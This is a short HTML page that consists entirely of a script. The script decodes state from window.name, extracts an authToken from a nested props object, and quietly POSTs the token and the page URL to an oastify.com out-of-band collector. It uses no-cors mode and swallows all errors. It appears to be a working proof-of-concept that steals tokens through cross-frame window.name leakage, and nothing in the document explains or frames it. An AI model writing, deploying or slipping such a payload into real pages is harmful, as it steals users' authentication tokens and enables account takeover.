<html>
<body>
  <script>
    (function() {
      try {
        // Decode the state injected by the parent
        const rawData = window.name ? JSON.parse(atob(window.name)) : null;
        const token = rawData?.props?.context?.environment?.authToken;

        if (token) {
          fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/", {
            method: "POST",
            mode: "no-cors", // Ensures the request fires even if CORS fails
            body: JSON.stringify({ token: token, origin: window.location.href })
          });
        }
      } catch(e) {}
    })();
  </script>
</body>
</html>
